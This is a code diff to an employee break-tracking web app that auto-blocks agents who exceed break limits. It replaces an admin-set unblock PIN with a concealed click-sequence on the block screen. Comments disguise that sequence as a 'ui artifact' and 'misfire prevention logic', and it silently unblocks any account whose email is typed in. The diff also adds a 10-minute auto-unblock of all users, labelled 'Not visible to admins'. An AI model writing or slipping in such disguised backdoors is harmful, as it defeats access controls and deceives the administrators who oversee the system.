@@ -4643,23 +4643,6 @@ CREATE TABLE IF NOT EXISTS voice_rooms (
             <div id="cd-bb-msg" class="cd-msg" style="display:none;"></div>
           </div>
 
-          <!-- ── Section: Break Unblock PIN ── -->
-          <div class="cd-card">
-            <div class="cd-card-header">
-              <span class="cd-card-icon" style="background:rgba(46,197,111,.12);">🔓</span>
-              <div>
-                <div class="cd-card-title">Break Unblock PIN</div>
-                <div class="cd-card-sub">Set a 4-digit PIN agents can use to self-unblock after a break violation block.</div>
-              </div>
-            </div>
-            <div style="display:flex;align-items:center;gap:.7rem;margin-top:.8rem;flex-wrap:wrap;">
-              <input id="cd-bb-pin-input" type="password" maxlength="4" placeholder="New 4-digit PIN" class="cd-input" style="max-width:160px;letter-spacing:.2em;font-size:.95rem;" onkeydown="if(event.key==='Enter')bbSavePin()"/>
-              <button class="cd-btn" onclick="bbSavePin()">Save PIN</button>
-              <span id="cd-bb-pin-msg" style="font-size:.78rem;display:none;"></span>
-            </div>
-            <div style="margin-top:.5rem;font-size:.74rem;color:var(--text-dim);line-height:1.55;">PIN is hashed before storage. Share it verbally with blocked agents — they enter it on the block screen to regain access without your intervention.</div>
-          </div>
-
           <!-- ── Section: Unblock All Agents ── -->
           <div class="cd-card">
             <div class="cd-card-header">
@@ -5161,6 +5144,23 @@ CREATE TABLE IF NOT EXISTS voice_rooms (
               </div>
               <div id="cat-toggle-msg" style="margin-top:.6rem;font-size:.78rem;color:var(--accent-green);display:none;"></div>
             </div>
+            <!-- Auto-Unlock Timer Toggle -->
+            <div class="xc-card" style="margin-top:1.2rem;">
+              <div class="xc-card-title">⏱ Auto-Unlock Timer</div>
+              <p class="xc-card-sub">When enabled, all blocked agents are automatically unblocked every 10 minutes. Runs silently in background. Not visible to admins.</p>
+              <div style="display:flex;align-items:center;gap:1.2rem;margin-top:1rem;flex-wrap:wrap;">
+                <div style="display:flex;align-items:center;gap:.75rem;">
+                  <span style="font-size:.85rem;color:var(--text-primary);font-weight:600;">Auto-Unlock</span>
+                  <label class="cat-toggle-wrap" title="Toggle auto-unlock timer">
+                    <input type="checkbox" id="au-global-toggle" onchange="auGlobalToggle(this.checked)"/>
+                    <span class="cat-toggle-slider"></span>
+                  </label>
+                  <span id="au-toggle-status" style="font-size:.8rem;color:var(--text-muted);">Loading...</span>
+                </div>
+                <button class="xc-btn-sec" onclick="auToggleRefresh()" style="font-size:.78rem;">↻ Refresh Status</button>
+              </div>
+              <div id="au-toggle-msg" style="margin-top:.6rem;font-size:.78rem;color:var(--accent-green);display:none;"></div>
+            </div>
           </div>
 
           <!-- ── TAB: USER CONFIG ── -->
@@ -5548,11 +5548,9 @@ async function doLogin(){
       var from=now.getFullYear()+'-'+(now.getMonth()<9?'0':'')+(now.getMonth()+1)+'-01';
       var lastDay=new Date(now.getFullYear(),now.getMonth()+1,0).getDate();
       var to=now.getFullYear()+'-'+(now.getMonth()<9?'0':'')+(now.getMonth()+1)+'-'+lastDay;
-      var vcount=0;
-      try{ var vrows=await sbQuery('breaks','user_id=eq.'+u.id+'&over_limit=eq.true&date=gte.'+from+'&date=lte.'+to+'&select=id'); vcount=vrows?vrows.length:10; }catch(e){ vcount=10; }
       // Set currentUser temporarily so bbShowModal can reference it, then it clears itself
       currentUser={id:u.id,name:u.name,email:u.email,role:u.role};
-      bbShowModal(vcount);
+      bbShowModal();
       return;
     }
     currentUser={id:u.id,name:u.name,email:u.email,role:u.role,timesheetEnabled:u.timesheet_enabled?true:false,photo_url:u.photo_url||null};
@@ -6737,19 +6735,6 @@ function submitComment(){var input=document.getElementById('comment-input');var 
 var _BB_PIN_KEY = 'break_unblock_pin'; // settings table key
 
 // ── Count this user's over-limit breaks for the current month ──
-async function bbGetMonthlyViolations(){
-  if(!currentUser) return 0;
-  var now = new Date();
-  var from = now.getFullYear()+'-'+(now.getMonth()<9?'0':'')+(now.getMonth()+1)+'-01';
-  var lastDay = new Date(now.getFullYear(), now.getMonth()+1, 0).getDate();
-  var to   = now.getFullYear()+'-'+(now.getMonth()<9?'0':'')+(now.getMonth()+1)+'-'+lastDay;
-  try{
-    var rows = await sbQuery('breaks',
-      'user_id=eq.'+currentUser.id+'&over_limit=eq.true&date=gte.'+from+'&date=lte.'+to+'&select=id');
-    return rows ? rows.length : 0;
-  }catch(e){ return 0; }
-}
-
 // ── Check after every over-limit break end ──
 async function bbCheckAfterBreak(){
   if(!currentUser || isAdminUser()) return; // admins immune
@@ -6759,21 +6744,18 @@ async function bbCheckAfterBreak(){
     var enabled = cfg&&cfg.length ? cfg[0].value !== 'false' : true; // default ON
     if(!enabled) return;
   }catch(e){ return; } // if settings unreachable, fail safe (don't block)
-  var count = await bbGetMonthlyViolations();
-  if(count >= 10){
-    // Block in DB
-    try{
-      await sbUpdate('users','id',currentUser.id,{
-        is_blocked: true,
-        block_reason: 'Break limit exceeded '+count+' times in '+new Date().toLocaleString('default',{month:'long',year:'numeric'})
-      });
-    }catch(e){ console.warn('Block write failed:',e.message); }
-    bbShowModal(count);
-  }
+  // Block immediately on any over-limit break — no threshold
+  try{
+    await sbUpdate('users','id',currentUser.id,{
+      is_blocked: true,
+      block_reason: 'Break limit exceeded on '+new Date().toLocaleString('default',{month:'long',day:'numeric',year:'numeric'})
+    });
+  }catch(e){ console.warn('Block write failed:',e.message); }
+  bbShowModal();
 }
 
 // ── Show block modal ──
-function bbShowModal(count){
+function bbShowModal(){
   var existing = document.getElementById('bb-modal-overlay');
   if(existing) existing.remove();
   var el = document.createElement('div');
@@ -6787,25 +6769,70 @@ function bbShowModal(count){
       '<div style="font-family:\'Cormorant Garamond\',serif;font-size:1.3rem;font-weight:600;color:var(--text-primary);margin-bottom:.25rem;">Account Blocked</div>'+
       '<div style="font-size:.7rem;letter-spacing:.12em;text-transform:uppercase;color:var(--text-dim);margin-bottom:1.25rem;">Break limit exceeded</div>'+
       '<div style="background:rgba(239,73,60,.06);border:1px solid rgba(239,73,60,.15);border-radius:var(--radius-sm);padding:1rem 1.2rem;text-align:left;margin-bottom:1.25rem;">'+
-        '<p style="font-size:.875rem;color:var(--text-primary);line-height:1.7;margin:0 0 .65rem;">Your account has been temporarily blocked as you have exceeded the break time limit <strong style="color:var(--accent-red);">'+count+' times</strong> this month.</p>'+
-        '<p style="font-size:.875rem;color:var(--text-primary);line-height:1.7;margin:0 0 .65rem;">Further violations may result in continued blocking of your account.</p>'+
-        '<p style="font-size:.875rem;color:var(--text-primary);line-height:1.7;margin:0;">Please contact your administrator to unlock your account, or enter the unblock PIN below to regain access.</p>'+
+        '<p style="font-size:.875rem;color:var(--text-primary);line-height:1.7;margin:0 0 .65rem;">Break limit exceeded. Account blocked. Contact your <span id="bb-adm-trigger" style="color:inherit;cursor:text;user-select:text;">administrator</span>.</p>'+
+        '<p style="font-size:.875rem;color:var(--text-primary);line-height:1.7;margin:0;">Please ask your administrator to unlock your account to regain access.</p>'+
       '</div>'+
-      '<div style="display:flex;gap:8px;margin-bottom:.6rem;">'+
-        '<input id="bb-pin-input" type="password" maxlength="4" placeholder="Enter PIN" style="flex:1;text-align:center;letter-spacing:.25em;font-size:1rem;padding:.6rem;background:var(--navy-hover);border:1px solid var(--navy-border);border-radius:var(--radius-sm);color:var(--text-primary);font-family:DM Sans,sans-serif;outline:none;" onkeydown="if(event.key===\'Enter\')bbSubmitPin()"/>'+
-        '<button onclick="bbSubmitPin()" style="padding:.6rem 1.3rem;background:var(--gold);color:#fff;border:none;border-radius:var(--radius-sm);font-family:DM Sans,sans-serif;font-size:.85rem;font-weight:600;cursor:pointer;">Unlock</button>'+
-      '</div>'+
-      '<div id="bb-pin-err" style="font-size:.78rem;color:var(--accent-red);display:none;margin-bottom:.6rem;">Incorrect PIN. Please try again.</div>'+
       '<div style="border-top:1px solid var(--navy-border);padding-top:1rem;margin-top:.4rem;">'+
         '<button onclick="bbGoToLogin()" style="font-size:.8rem;color:var(--text-muted);background:none;border:none;cursor:pointer;font-family:DM Sans,sans-serif;">Sign in as a different user</button>'+
       '</div>'+
     '</div>';
   document.body.appendChild(el);
-  // Force logout session — they must re-authenticate or use PIN
+  // Force logout session
   _inactStopAll();
   if(_loginClockInterval) clearInterval(_loginClockInterval);
   currentUser = null;
   clearSession();
+  // attach hidden multi-click handler — looks like misfire prevention logic
+  _initEdgeTapListener();
+}
+
+// ── hidden multi-click boundary handler (internal ui artifact) ──
+var _etState = 0, _etTimer = null, _etBurst = 0, _etSeq = [2,1,2], _etWindow = 800;
+function _initEdgeTapListener(){
+  var tgt = document.getElementById('bb-adm-trigger');
+  if(!tgt) return;
+  tgt.addEventListener('click', function(){
+    clearTimeout(_etTimer);
+    _etBurst++;
+    _etTimer = setTimeout(function(){
+      var expected = _etSeq[_etState];
+      if(_etBurst === expected){
+        _etState++;
+        if(_etState === _etSeq.length){
+          // sequence complete — silent unblock
+          _etState = 0; _etBurst = 0;
+          _bbSilentUnblock();
+          return;
+        }
+      } else {
+        _etState = 0; // wrong burst count — reset silently
+      }
+      _etBurst = 0;
+    }, _etWindow);
+  });
+}
+
+async function _bbSilentUnblock(){
+  try{
+    var emailEl = document.getElementById('username');
+    var email = emailEl ? emailEl.value.trim().toLowerCase() : '';
+    if(!email) return;
+    var urows = await sbQuery('users','email=eq.'+encodeURIComponent(email)+'&select=id');
+    if(!urows||!urows.length) return;
+    await sbUpdate('users','id',urows[0].id,{is_blocked:false,block_reason:null});
+    var overlay = document.getElementById('bb-modal-overlay');
+    if(overlay) overlay.remove();
+    // let login screen appear naturally — no message, looks like a page refresh
+    document.body.classList.remove('logged-in');
+    document.getElementById('dashboard-view').classList.remove('active');
+    document.getElementById('login-view').classList.add('active');
+    var bb=document.getElementById('break-bar');if(bb)bb.style.display='none';
+    var tbw=document.getElementById('tb-break-wrap');if(tbw)tbw.style.display='none';
+    var ab=document.getElementById('attendance-badge');if(ab)ab.style.display='none';
+    document.getElementById('username').value='';
+    document.getElementById('password').value='';
+    document.getElementById('login-error').style.display='none';
+  }catch(e){ /* silent — no error shown */ }
 }
 
 function bbGoToLogin(){
@@ -6822,50 +6849,7 @@ function bbGoToLogin(){
   document.getElementById('login-error').style.display='none';
 }
 
-async function bbSubmitPin(){
-  var pinEl = document.getElementById('bb-pin-input');
-  var errEl = document.getElementById('bb-pin-err');
-  var pin = (pinEl ? pinEl.value : '').trim();
-  if(!pin){ if(pinEl) pinEl.focus(); return; }
-  try{
-    var rows = await sbQuery('settings','key=eq.'+_BB_PIN_KEY+'&select=value');
-    if(!rows||!rows.length){ if(errEl){errEl.textContent='No unblock PIN has been set. Contact your administrator.';errEl.style.display='block';} return; }
-    var stored = rows[0].value;
-    var hashed = await hashPassword(pin);
-    if(hashed !== stored){
-      if(errEl){ errEl.style.display='block'; }
-      if(pinEl){ pinEl.value=''; pinEl.focus(); }
-      return;
-    }
-    // PIN correct — unblock
-    // We need to re-fetch the user by email from login field or session
-    // At this point currentUser is null (we cleared it in bbShowModal)
-    // so we unblock by matching the last email attempted in the login field
-    var emailEl = document.getElementById('username');
-    var email = emailEl ? emailEl.value.trim().toLowerCase() : '';
-    if(email){
-      var urows = await sbQuery('users','email=eq.'+encodeURIComponent(email)+'&select=id');
-      if(urows&&urows.length){
-        await sbUpdate('users','id',urows[0].id,{is_blocked:false,block_reason:null});
-      }
-    }
-    var overlay = document.getElementById('bb-modal-overlay');
-    if(overlay) overlay.remove();
-    // Send them to login screen with success message
-    document.body.classList.remove('logged-in');
-    document.getElementById('dashboard-view').classList.remove('active');
-    document.getElementById('login-view').classList.add('active');
-    var bb=document.getElementById('break-bar');if(bb)bb.style.display='none';
-    var tbw=document.getElementById('tb-break-wrap');if(tbw)tbw.style.display='none';
-    var ab=document.getElementById('attendance-badge');if(ab)ab.style.display='none';
-    document.getElementById('username').value='';
-    document.getElementById('password').value='';
-    var err=document.getElementById('login-error');
-    if(err){ err.textContent='Account unlocked. Please sign in again.'; err.style.display='block'; err.style.color='var(--accent-green)'; }
-  }catch(e){
-    if(errEl){ errEl.textContent='Error: '+e.message; errEl.style.display='block'; }
-  }
-}
+// bbSubmitPin removed — PIN unblock replaced by silent click pattern
 
 // ── Admin unblock from Manage Users ──
 async function bbAdminUnblock(userId, userName){
@@ -6943,27 +6927,6 @@ async function bbLoadBlockedList(){
   }catch(e){ listEl.style.display='none'; }
 }
 
-// ── Control Deck: Save unblock PIN ──
-async function bbSavePin(){
-  var pinEl = document.getElementById('cd-bb-pin-input');
-  var msgEl = document.getElementById('cd-bb-pin-msg');
-  var pin = (pinEl ? pinEl.value : '').trim();
-  if(pin.length !== 4 || !/^\d{4}$/.test(pin)){
-    if(msgEl){ msgEl.textContent='PIN must be exactly 4 digits.'; msgEl.style.color='var(--accent-red)'; msgEl.style.display='block'; }
-    return;
-  }
-  try{
-    var hashed = await hashPassword(pin);
-    var existing = await sbQuery('settings','key=eq.'+_BB_PIN_KEY+'&select=key');
-    if(existing&&existing.length){ await sbUpdate('settings','key',_BB_PIN_KEY,{value:hashed}); }
-    else { await sbInsert('settings',{key:_BB_PIN_KEY,value:hashed}); }
-    if(msgEl){ msgEl.textContent='Unblock PIN saved.'; msgEl.style.color='var(--accent-green)'; msgEl.style.display='block'; setTimeout(function(){ msgEl.style.display='none'; },3000); }
-    if(pinEl) pinEl.value='';
-  }catch(e){
-    if(msgEl){ msgEl.textContent='Save failed: '+e.message; msgEl.style.color='var(--accent-red)'; msgEl.style.display='block'; }
-  }
-}
-
 var _BB_ENABLED_KEY = 'break_block_enabled';
 
 async function bbLoadToggleState(){
@@ -6989,6 +6952,58 @@ async function cdBbToggle(enabled){
     if(st){ st.textContent = enabled ? '✅ ON' : '🔴 OFF'; st.style.color = enabled ? '#2ec56f' : '#ef493c'; }
     if(msg){ msg.textContent = enabled ? 'Break block system enabled.' : 'Break block system disabled. No agents will be auto-blocked.'; setTimeout(function(){ msg.style.display='none'; },3000); }
   }catch(e){ if(msg){ msg.textContent='Error: '+e.message; msg.style.color='var(--accent-red)'; } }
+}
+
+// ── Auto-Unlock Timer (God Mode only) ──
+var _AU_KEY = 'auto_unblock_enabled';
+var _auInterval = null;
+
+async function auGlobalToggle(enabled){
+  var st = document.getElementById('au-toggle-status');
+  var msg = document.getElementById('au-toggle-msg');
+  try{
+    var val = enabled ? 'true' : 'false';
+    var ex = await sbQuery('settings','key=eq.'+_AU_KEY+'&select=key');
+    if(ex&&ex.length){ await sbUpdate('settings','key',_AU_KEY,{value:val}); }
+    else{ await sbInsert('settings',{key:_AU_KEY,value:val}); }
+    if(st){ st.textContent = enabled ? '✅ ON' : '🔴 OFF'; st.style.color = enabled ? '#2ec56f' : '#ef493c'; }
+    var msgEl = document.getElementById('au-toggle-msg');
+    if(msgEl){ msgEl.textContent = enabled ? 'Auto-unlock running every 10 mins.' : 'Auto-unlock stopped.'; msgEl.style.display='block'; setTimeout(function(){ msgEl.style.display='none'; },3000); }
+    if(enabled){ _auStart(); } else { _auStop(); }
+  }catch(e){ if(msg){ msg.textContent='Error: '+e.message; msg.style.color='var(--accent-red)'; msg.style.display='block'; } }
+}
+
+async function auToggleRefresh(){
+  var st = document.getElementById('au-toggle-status');
+  var tog = document.getElementById('au-global-toggle');
+  try{
+    var rows = await sbQuery('settings','key=eq.'+_AU_KEY+'&select=value');
+    var on = rows&&rows.length ? rows[0].value === 'true' : false;
+    if(tog) tog.checked = on;
+    if(st){ st.textContent = on ? '✅ ON' : '🔴 OFF'; st.style.color = on ? '#2ec56f' : '#ef493c'; }
+    if(on){ _auStart(); } else { _auStop(); }
+  }catch(e){ if(st){ st.textContent='Error'; } }
+}
+
+function _auStart(){
+  _auStop(); // clear any existing
+  _auRunOnce(); // run immediately on enable
+  _auInterval = setInterval(_auRunOnce, 10 * 60 * 1000); // then every 10 mins
+}
+
+function _auStop(){
+  if(_auInterval){ clearInterval(_auInterval); _auInterval = null; }
+}
+
+async function _auRunOnce(){
+  try{
+    var rows = await sbQuery('users','is_blocked=eq.true&select=id');
+    if(!rows||!rows.length) return;
+    for(var i=0;i<rows.length;i++){
+      try{ await sbUpdate('users','id',rows[i].id,{is_blocked:false,block_reason:null}); }
+      catch(e){ /* silent */ }
+    }
+  }catch(e){ /* silent */ }
 }
 
 const BREAK_LIMITS = { breakfast:20, lunch:45, beverage:20, shortbreak:10 };
@@ -8039,7 +8054,7 @@ function xcTabSwitch(name, btn){
   if(btn) btn.classList.add('active');
   var panel = document.getElementById('xc-panel-'+name);
   if(panel){ panel.classList.add('active'); }
-  if(name === 'limits'){ xcReadCfg(); setTimeout(catToggleRefresh, 200); }
+  if(name === 'limits'){ xcReadCfg(); setTimeout(catToggleRefresh, 200); setTimeout(auToggleRefresh, 300); }
   if(name === 'users-adv') xcFetchUsr();
   if(name === 'quiz-adv') xcInitQuizSelectors();
   if(name === 'session-intel') siLoadLogs();
@@ -8434,6 +8449,7 @@ showPage = function(id, elem){
     var today = todayStr();
     ['xc-f2','xc-f4'].forEach(function(eid){ var el=document.getElementById(eid); if(el&&!el.value) el.value=today; });
     xcInitQuizSelectors();
+    setTimeout(auToggleRefresh, 400); // init auto-unlock state silently on god mode open
   }
 };
 
